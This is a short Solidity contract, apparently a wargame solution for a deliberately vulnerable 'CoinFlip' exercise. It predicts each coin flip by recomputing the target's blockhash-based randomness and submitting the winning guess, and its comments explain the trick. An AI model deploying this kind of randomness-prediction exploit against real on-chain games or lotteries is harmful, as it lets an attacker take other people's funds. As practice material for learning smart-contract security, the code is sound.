// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
// We have to import 3-CoinFlip.sol to know functions and variable of CoinFlip contract
import "./3-CoinFlip.sol";

contract CoinFlipAttacker {
    using SafeMath for uint256;
    // We have to connect with CoinFlip contract
    CoinFlip public challenge;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address challengeAddress) public {
        /*We use address of CoinFlip contract to create connection with it. 
        For now we can use CoinFlip's function*/
        challenge = CoinFlip(challengeAddress);
    }

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        /*Now we know what value will have coinFlip so we could
        'guess' the resultat with 100% resultat.  */
        challenge.flip(side);
    }
}
